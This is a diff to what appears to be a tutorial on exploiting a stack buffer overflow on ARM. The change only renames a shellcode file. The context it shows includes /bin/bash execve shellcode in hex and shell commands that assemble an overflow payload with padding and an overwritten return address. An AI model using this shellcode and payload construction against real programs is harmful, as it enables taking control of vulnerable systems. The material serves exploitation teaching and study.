@@ -109,8 +109,8 @@ This prints
 Because '0x415-0x3f0' equals 37 in decimal, we round it to 40 bytes (so
 that the code is 4-byte aligned) for the shell code.
 ```
-$ xxd -s0x415 -l40 -p shell > shellcode
-$ cat shellcode
+$ xxd -s0x415 -l40 -p shell > shellcode.txt
+$ cat shellcode.txt
 040000ea0e00a0e1011021e0022022e00b70a0e3000000eff9ffffeb2f62
 696e2f6261736800dead
 ```
@@ -202,7 +202,7 @@ To implement the above strategy
    $ pad=$(for i in `seq 40`; do echo -n '42'; done)
    $ r11=$(printf %08x 0x0 | tac -rs..)
    $ ret=$(printf %08x 0x7efff1f8 | tac -rs..) # little endian
-   $ (cat shellcode; echo -n $pad; echo -n $r11; echo -n $ret) | xxd -r -p > payload
+   $ (cat shellcode.txt; echo -n $pad; echo -n $r11; echo -n $ret) | xxd -r -p > payload
    ```
    If we run `xxd payload`, we will see the payload content as
    follows:
